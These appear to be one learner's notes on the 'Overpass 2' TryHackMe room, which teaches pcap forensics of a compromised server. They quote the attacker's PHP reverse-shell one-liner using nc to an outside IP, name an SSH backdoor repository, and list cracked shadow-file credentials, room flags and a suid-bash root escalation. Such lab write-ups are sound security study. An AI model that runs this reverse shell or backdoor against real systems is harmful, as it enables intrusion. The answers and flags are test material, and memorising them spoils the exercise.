Tags:OverPass 2 THM box
When: [[todo 2]]

##Note:

# Questions
- What was the URL of the page they used to upload a reverse shell?
==/development==
- What payload did the attacker use to gain access?
==<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>==
- What password did the attacker use to privesc?
==whenevernoteartinstant==
- How did the attacker establish persistence?
git clone https://github.com/NinjaJc01/ssh-backdoor
- Using the fasttrack wordlist, how many of the system passwords were crackable?
4
What's the default hash for the backdoor?
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

- What's the hardcoded salt for the backdoor?
1c362db832f3f864c8c2fe05f2002a05

- What was the hash that the attacker used? - go back to the PCAP for this!

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

- Crack the hash using rockyou and a cracking tool of your choice. What's the password?

november16
- The attacker defaced the website. What message did they leave as a heading?

 H4ck3d by CooctusClan

- What's the user flag?
thm{d119b4fa8c497ddb0525f7ad200e6567}


- What's the root flag?
thm{d53b2684f169360bb9606c333873144d}



# Creds
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::

paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::

bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::

muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::

szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::

Using John 
james:whenevernoteartinstant:november16
paradox:security3
syzmex:abcd123
bee:secret12
muirland:1qaz2wsx

# Enumeration 
Nmap scan
| ssh-hostkey: 
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (EdDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)

after checking the Wireshark captured files and following the TCP stream we find that the attacker used /development to upload their payload and it's called payload.php 
![[Pasted image 20210919013318.png]]

Following another TCP stream we find out where is the Netcat Session is and it's in plain text 

![[Pasted image 20210919013638.png]]

then we try to crack the hash the attacker got and the salt from the backdoor software 
password is november16
going into james ssh at port 2222 and password we just found we are in!



# Privesc 
running sudo -l doesn't work cos we don't know james password 
running ls -la find out there is a suid_bash with +s perm e.e 
running it with -p gives us root access 



# Conclusion

- How to analysis a pcap wireshark file and find out how the attack was done   